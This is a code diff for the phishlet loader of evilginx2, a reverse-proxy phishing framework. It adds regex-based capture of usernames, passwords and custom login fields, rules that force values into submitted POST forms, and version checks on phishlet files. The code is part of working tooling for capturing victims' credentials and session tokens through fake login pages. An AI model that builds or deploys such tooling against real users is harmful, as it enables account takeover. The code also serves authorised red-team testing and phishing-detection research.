@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"net/url"
 	"regexp"
+	"strconv"
 	"strings"
 
 	"github.com/spf13/viper"
@@ -35,42 +36,71 @@ type AuthToken struct {
 	optional  bool
 }
 
+type PhishletVersion struct {
+	major int
+	minor int
+	build int
+}
+
+type PostField struct {
+	tp     string
+	key_s  string
+	key    *regexp.Regexp
+	search *regexp.Regexp
+}
+
+type ForcePostSearch struct {
+	key    *regexp.Regexp `mapstructure:"key"`
+	search *regexp.Regexp `mapstructure:"search"`
+}
+
+type ForcePostForce struct {
+	key   string `mapstructure:"key"`
+	value string `mapstructure:"value"`
+}
+
+type ForcePost struct {
+	path   *regexp.Regexp    `mapstructure:"path"`
+	search []ForcePostSearch `mapstructure:"search"`
+	force  []ForcePostForce  `mapstructure:"force"`
+	tp     string            `mapstructure:"type"`
+}
+
 type Phishlet struct {
-	Site          string
-	Name          string
-	Author        string
-	minVersion    string
-	proxyHosts    []ProxyHost
-	domains       []string
-	subfilters    map[string][]SubFilter
-	authTokens    map[string][]*AuthToken
-	authUrls      []*regexp.Regexp
-	k_username    string
-	k_re_username *regexp.Regexp
-	re_username   string
-	k_password    string
-	k_re_password *regexp.Regexp
-	re_password   string
-	landing_path  []string
-	cfg           *Config
+	Site         string
+	Name         string
+	Author       string
+	Version      PhishletVersion
+	minVersion   string
+	proxyHosts   []ProxyHost
+	domains      []string
+	subfilters   map[string][]SubFilter
+	authTokens   map[string][]*AuthToken
+	authUrls     []*regexp.Regexp
+	username     PostField
+	password     PostField
+	landing_path []string
+	cfg          *Config
+	custom       []PostField
+	forcePost    []ForcePost
 }
 
 type ConfigProxyHost struct {
-	PhishSub  string `mapstructure:"phish_sub"`
-	OrigSub   string `mapstructure:"orig_sub"`
-	Domain    string `mapstructure:"domain"`
-	Session   bool   `mapstructure:"session"`
-	IsLanding bool   `mapstructure:"is_landing"`
+	PhishSub  *string `mapstructure:"phish_sub"`
+	OrigSub   *string `mapstructure:"orig_sub"`
+	Domain    *string `mapstructure:"domain"`
+	Session   bool    `mapstructure:"session"`
+	IsLanding bool    `mapstructure:"is_landing"`
 }
 
 type ConfigSubFilter struct {
-	Hostname     string   `mapstructure:"hostname"`
-	Sub          string   `mapstructure:"sub"`
-	Domain       string   `mapstructure:"domain"`
-	Search       string   `mapstructure:"search"`
-	Replace      string   `mapstructure:"replace"`
-	Mimes        []string `mapstructure:"mimes"`
-	RedirectOnly bool     `mapstructure:"redirect_only"`
+	Hostname     *string   `mapstructure:"triggers_on"`
+	Sub          *string   `mapstructure:"orig_sub"`
+	Domain       *string   `mapstructure:"domain"`
+	Search       *string   `mapstructure:"search"`
+	Replace      *string   `mapstructure:"replace"`
+	Mimes        *[]string `mapstructure:"mimes"`
+	RedirectOnly bool      `mapstructure:"redirect_only"`
 }
 
 type ConfigAuthToken struct {
@@ -78,25 +108,44 @@ type ConfigAuthToken struct {
 	Keys   []string `mapstructure:"keys"`
 }
 
-type ConfigUserRegex struct {
-	Key string `mapstructure:"key"`
-	Re  string `mapstructure:"re"`
+type ConfigPostField struct {
+	Key    *string `mapstructure:"key"`
+	Search *string `mapstructure:"search"`
+	Type   string  `mapstructure:"type"`
 }
 
-type ConfigPassRegex struct {
-	Key string `mapstructure:"key"`
-	Re  string `mapstructure:"re"`
+type ConfigCredentials struct {
+	Username *ConfigPostField   `mapstructure:"username"`
+	Password *ConfigPostField   `mapstructure:"password"`
+	Custom   *[]ConfigPostField `mapstructure:"custom"`
+}
+
+type ConfigForcePostSearch struct {
+	Key    *string `mapstructure:"key"`
+	Search *string `mapstructure:"search"`
+}
+
+type ConfigForcePostForce struct {
+	Key   *string `mapstructure:"key"`
+	Value *string `mapstructure:"value"`
+}
+
+type ConfigForcePost struct {
+	Path   *string                  `mapstructure:"path"`
+	Search *[]ConfigForcePostSearch `mapstructure:"search"`
+	Force  *[]ConfigForcePostForce  `mapstructure:"force"`
+	Type   *string                  `mapstructure:"type"`
 }
 
 type ConfigPhishlet struct {
-	Name        string            `mapstructure:"name"`
-	ProxyHosts  []ConfigProxyHost `mapstructure:"proxy_hosts"`
-	SubFilters  []ConfigSubFilter `mapstructure:"sub_filters"`
-	AuthTokens  []ConfigAuthToken `mapstructure:"auth_tokens"`
-	AuthUrls    []string          `mapstructure:"auth_urls"`
-	UserRegex   ConfigUserRegex   `mapstructure:"user_regex"`
-	PassRegex   ConfigPassRegex   `mapstructure:"pass_regex"`
-	LandingPath []string          `mapstructure:"landing_path"`
+	Name        string             `mapstructure:"name"`
+	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
+	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters"`
+	AuthTokens  *[]ConfigAuthToken `mapstructure:"auth_tokens"`
+	AuthUrls    []string           `mapstructure:"auth_urls"`
+	Credentials *ConfigCredentials `mapstructure:"credentials"`
+	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post"`
+	LandingPath *[]string          `mapstructure:"landing_path"`
 }
 
 func NewPhishlet(site string, path string, cfg *Config) (*Phishlet, error) {
@@ -106,7 +155,7 @@ func NewPhishlet(site string, path string, cfg *Config) (*Phishlet, error) {
 	}
 	p.Clear()
 
-	err := p.LoadFromFile(path)
+	err := p.LoadFromFile(site, path)
 	if err != nil {
 		return nil, err
 	}
@@ -121,15 +170,15 @@ func (p *Phishlet) Clear() {
 	p.subfilters = make(map[string][]SubFilter)
 	p.authTokens = make(map[string][]*AuthToken)
 	p.authUrls = []*regexp.Regexp{}
-	p.k_username = ""
-	p.k_re_username = nil
-	p.re_username = ""
-	p.k_password = ""
-	p.k_re_password = nil
-	p.re_password = ""
+	p.username.key = nil
+	p.username.search = nil
+	p.password.key = nil
+	p.password.search = nil
+	p.custom = []PostField{}
+	p.forcePost = []ForcePost{}
 }
 
-func (p *Phishlet) LoadFromFile(path string) error {
+func (p *Phishlet) LoadFromFile(site string, path string) error {
 	p.Clear()
 
 	c := viper.New()
@@ -141,25 +190,88 @@ func (p *Phishlet) LoadFromFile(path string) error {
 		return err
 	}
 
-	p.Name = c.GetString("name")
+	p.Name = site
 	p.Author = c.GetString("author")
-
-	fp := ConfigPhishlet{
-		ProxyHosts: make([]ConfigProxyHost, 0),
+	p.Version, err = p.parseVersion(c.GetString("min_ver"))
+	if err != nil {
+		return err
 	}
+	if !p.isVersionHigherEqual(&p.Version, "2.2.0") {
+		return fmt.Errorf("this phishlet is incompatible with current version of evilginx.\nplease do the following modifications to update it:\n\n" +
+			"- in each `sub_filters` item change `hostname` to `triggers_on`\n" +
+			"- in each `sub_filters` item change `sub` to `orig_sub`\n" +
+			"- rename section `user_regex` to `username`\n" +
+			"- rename section `pass_regex` to `password`\n" +
+			"- rename field `re` in both `username` and `password` to `search`\n" +
+			"- field `key` in both `username` and `password` must be a regexp by default\n" +
+			"- move `username` and `password` into new `credentials` section\n" +
+			"- add `type` field to `username` and `password` with value 'post' or 'json'\n" +
+			"- change `min_ver` to at least `2.2.0`\n" +
+			"you can find the phishlet 2.2.0 file format documentation here: https://github.com/kgretzky/evilginx2/wiki/Phishlet-File-Format-(2.2.0)")
+	}
+
+	fp := ConfigPhishlet{}
 	err = c.Unmarshal(&fp)
 	if err != nil {
 		return err
 	}
 
-	p.Name = fp.Name
-	for _, ph := range fp.ProxyHosts {
-		p.addProxyHost(ph.PhishSub, ph.OrigSub, ph.Domain, ph.Session, ph.IsLanding)
+	if fp.ProxyHosts == nil {
+		return fmt.Errorf("missing `proxy_hosts` section")
 	}
-	for _, sf := range fp.SubFilters {
-		p.addSubFilter(sf.Hostname, sf.Sub, sf.Domain, sf.Mimes, sf.Search, sf.Replace, sf.RedirectOnly)
+	if fp.SubFilters == nil {
+		return fmt.Errorf("missing `sub_filters` section")
 	}
-	for _, at := range fp.AuthTokens {
+	if fp.AuthTokens == nil {
+		return fmt.Errorf("missing `auth_tokens` section")
+	}
+	if fp.Credentials == nil {
+		return fmt.Errorf("missing `credentials` section")
+	}
+	if fp.Credentials.Username == nil {
+		return fmt.Errorf("credentials: missing `username` section")
+	}
+	if fp.Credentials.Password == nil {
+		return fmt.Errorf("credentials: missing `password` section")
+	}
+	if fp.LandingPath == nil {
+		return fmt.Errorf("missing `landing_path` section")
+	}
+
+	for _, ph := range *fp.ProxyHosts {
+		if ph.PhishSub == nil {
+			return fmt.Errorf("proxy_hosts: missing `phish_sub` field")
+		}
+		if ph.OrigSub == nil {
+			return fmt.Errorf("proxy_hosts: missing `orig_sub` field")
+		}
+		if ph.Domain == nil {
+			return fmt.Errorf("proxy_hosts: missing `domain` field")
+		}
+		p.addProxyHost(*ph.PhishSub, *ph.OrigSub, *ph.Domain, ph.Session, ph.IsLanding)
+	}
+	for _, sf := range *fp.SubFilters {
+		if sf.Hostname == nil {
+			return fmt.Errorf("sub_filters: missing `triggers_on` field")
+		}
+		if sf.Sub == nil {
+			return fmt.Errorf("sub_filters: missing `orig_sub` field")
+		}
+		if sf.Domain == nil {
+			return fmt.Errorf("sub_filters: missing `domain` field")
+		}
+		if sf.Mimes == nil {
+			return fmt.Errorf("sub_filters: missing `mimes` field")
+		}
+		if sf.Search == nil {
+			return fmt.Errorf("sub_filters: missing `search` field")
+		}
+		if sf.Replace == nil {
+			return fmt.Errorf("sub_filters: missing `replace` field")
+		}
+		p.addSubFilter(*sf.Hostname, *sf.Sub, *sf.Domain, *sf.Mimes, *sf.Search, *sf.Replace, sf.RedirectOnly)
+	}
+	for _, at := range *fp.AuthTokens {
 		err := p.addAuthTokens(at.Domain, at.Keys)
 		if err != nil {
 			return err
@@ -173,47 +285,137 @@ func (p *Phishlet) LoadFromFile(path string) error {
 		p.authUrls = append(p.authUrls, re)
 	}
 
-	st := strings.Split(fp.UserRegex.Key, ",")
-	if len(st) > 0 {
-		key := st[0]
-		p.k_username = key
+	if fp.Credentials.Username.Key == nil {
+		return fmt.Errorf("credentials: missing username `key` field")
+	}
+	if fp.Credentials.Username.Search == nil {
+		return fmt.Errorf("credentials: missing username `search` field")
+	}
+	if fp.Credentials.Password.Key == nil {
+		return fmt.Errorf("credentials: missing password `key` field")
+	}
+	if fp.Credentials.Password.Search == nil {
+		return fmt.Errorf("credentials: missing password `search` field")
+	}
 
-		for i := 1; i < len(st); i++ {
-			switch st[i] {
-			case "regexp":
-				var err error
-				p.k_re_username, err = regexp.Compile(key)
-				if err != nil {
-					return err
+	p.username.key, err = regexp.Compile(*fp.Credentials.Username.Key)
+	if err != nil {
+		return fmt.Errorf("credentials: %v", err)
+	}
+
+	p.username.search, err = regexp.Compile(*fp.Credentials.Username.Search)
+	if err != nil {
+		return fmt.Errorf("credentials: %v", err)
+	}
+
+	p.password.key, err = regexp.Compile(*fp.Credentials.Password.Key)
+	if err != nil {
+		return fmt.Errorf("credentials: %v", err)
+	}
+
+	p.password.search, err = regexp.Compile(*fp.Credentials.Password.Search)
+	if err != nil {
+		return fmt.Errorf("credentials: %v", err)
+	}
+
+	p.username.tp = fp.Credentials.Username.Type
+	if p.username.tp == "" {
+		p.username.tp = "post"
+	}
+	p.password.tp = fp.Credentials.Password.Type
+	if p.password.tp == "" {
+		p.password.tp = "post"
+	}
+	p.username.key_s = *fp.Credentials.Username.Key
+	p.password.key_s = *fp.Credentials.Password.Key
+
+	if fp.Credentials.Custom != nil {
+		for _, cp := range *fp.Credentials.Custom {
+			var err error
+			if cp.Key == nil {
+				return fmt.Errorf("credentials: missing custom `key` field")
+			}
+			if cp.Search == nil {
+				return fmt.Errorf("credentials: missing custom `search` field")
+			}
+			o := PostField{}
+			o.key, err = regexp.Compile(*cp.Key)
+			if err != nil {
+				return fmt.Errorf("credentials: %v", err)
+			}
+			o.search, err = regexp.Compile(*cp.Search)
+			if err != nil {
+				return err
+			}
+			o.tp = cp.Type
+			if o.tp == "" {
+				o.tp = "post"
+			}
+			o.key_s = *cp.Key
+			p.custom = append(p.custom, o)
+		}
+	}
+
+	if fp.ForcePosts != nil {
+		for _, op := range *fp.ForcePosts {
+			var err error
+			if op.Path == nil || *op.Path == "" {
+				return fmt.Errorf("force_post: missing or empty `path` field")
+			}
+			if op.Type == nil || *op.Type != "post" {
+				return fmt.Errorf("force_post: unknown type - only 'post' is currently supported")
+			}
+			if op.Force == nil || len(*op.Force) == 0 {
+				return fmt.Errorf("force_post: missing or empty `force` field")
+			}
+
+			fpf := ForcePost{}
+			fpf.path, err = regexp.Compile(*op.Path)
+			if err != nil {
+				return err
+			}
+			fpf.tp = *op.Type
+
+			if op.Search != nil {
+				for _, op_s := range *op.Search {
+					if op_s.Key == nil {
+						return fmt.Errorf("force_post: missing search `key` field")
+					}
+					if op_s.Search == nil {
+						return fmt.Errorf("force_post: missing search `search` field")
+					}
+
+					f_s := ForcePostSearch{}
+					f_s.key, err = regexp.Compile(*op_s.Key)
+					if err != nil {
+						return err
+					}
+					f_s.search, err = regexp.Compile(*op_s.Search)
+					if err != nil {
+						return err
+					}
+					fpf.search = append(fpf.search, f_s)
 				}
 			}
-		}
-	} else {
-		return fmt.Errorf("user_regex key name can't be empty")
-	}
-	p.re_username = fp.UserRegex.Re
-
-	st = strings.Split(fp.PassRegex.Key, ",")
-	if len(st) > 0 {
-		key := st[0]
-		p.k_password = key
-
-		for i := 1; i < len(st); i++ {
-			switch st[i] {
-			case "regexp":
-				var err error
-				p.k_re_password, err = regexp.Compile(key)
-				if err != nil {
-					return err
+			for _, op_f := range *op.Force {
+				if op_f.Key == nil {
+					return fmt.Errorf("force_post: missing force `key` field")
 				}
-			}
-		}
-	} else {
-		return fmt.Errorf("pass_regex key name can't be empty")
-	}
-	p.re_password = fp.PassRegex.Re
+				if op_f.Value == nil {
+					return fmt.Errorf("force_post: missing force `value` field")
+				}
 
-	p.landing_path = fp.LandingPath
+				f_f := ForcePostForce{
+					key:   *op_f.Key,
+					value: *op_f.Value,
+				}
+				fpf.force = append(fpf.force, f_f)
+			}
+			p.forcePost = append(p.forcePost, fpf)
+		}
+	}
+
+	p.landing_path = *fp.LandingPath
 
 	return nil
 }
@@ -288,6 +490,9 @@ func (p *Phishlet) GenerateTokenSet(tokens map[string]string) map[string]map[str
 }
 
 func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, domain string, handle_session bool, is_landing bool) {
+	phish_subdomain = strings.ToLower(phish_subdomain)
+	orig_subdomain = strings.ToLower(orig_subdomain)
+	domain = strings.ToLower(domain)
 	if !p.domainExists(domain) {
 		p.domains = append(p.domains, domain)
 	}
@@ -296,6 +501,12 @@ func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, d
 }
 
 func (p *Phishlet) addSubFilter(hostname string, subdomain string, domain string, mime []string, regexp string, replace string, redirect_only bool) {
+	hostname = strings.ToLower(hostname)
+	subdomain = strings.ToLower(subdomain)
+	domain = strings.ToLower(domain)
+	for n, _ := range mime {
+		mime[n] = strings.ToLower(mime[n])
+	}
 	p.subfilters[hostname] = append(p.subfilters[hostname], SubFilter{subdomain: subdomain, domain: domain, mime: mime, regexp: regexp, replace: replace, redirect_only: redirect_only})
 }
 
@@ -326,24 +537,6 @@ func (p *Phishlet) addAuthTokens(hostname string, tokens []string) error {
 			p.authTokens[hostname] = append(p.authTokens[hostname], at)
 		}
 	}
-	return nil
-}
-
-func (p *Phishlet) setUsernameRegexp(key string, v_regex string) error {
-	if _, err := regexp.Compile(v_regex); err != nil {
-		return err
-	}
-	p.k_username = key
-	p.re_username = v_regex
-	return nil
-}
-
-func (p *Phishlet) setPasswordRegexp(key string, v_regex string) error {
-	if _, err := regexp.Compile(v_regex); err != nil {
-		return err
-	}
-	p.k_password = key
-	p.re_password = v_regex
 	return nil
 }
 
@@ -387,4 +580,41 @@ func (p *Phishlet) isTokenHttpOnly(domain string, token string) bool {
 
 func (p *Phishlet) MimeExists(mime string) bool {
 	return false
+}
+
+func (p *Phishlet) isVersionHigherEqual(pv *PhishletVersion, cver string) bool {
+	cv, err := p.parseVersion(cver)
+	if err != nil {
+		return false
+	}
+
+	if pv.major > cv.major {
+		return true
+	}
+	if pv.major == cv.major && pv.minor >= cv.minor {
+		return true
+	}
+	return false
+}
+
+func (p *Phishlet) parseVersion(ver string) (PhishletVersion, error) {
+	ret := PhishletVersion{}
+	va := strings.Split(ver, ".")
+	if len(va) != 3 {
+		return ret, fmt.Errorf("invalid version format (must be X.Y.Z)")
+	}
+	var err error
+	ret.major, err = strconv.Atoi(va[0])
+	if err != nil {
+		return ret, err
+	}
+	ret.minor, err = strconv.Atoi(va[1])
+	if err != nil {
+		return ret, err
+	}
+	ret.build, err = strconv.Atoi(va[2])
+	if err != nil {
+		return ret, err
+	}
+	return ret, nil
 }
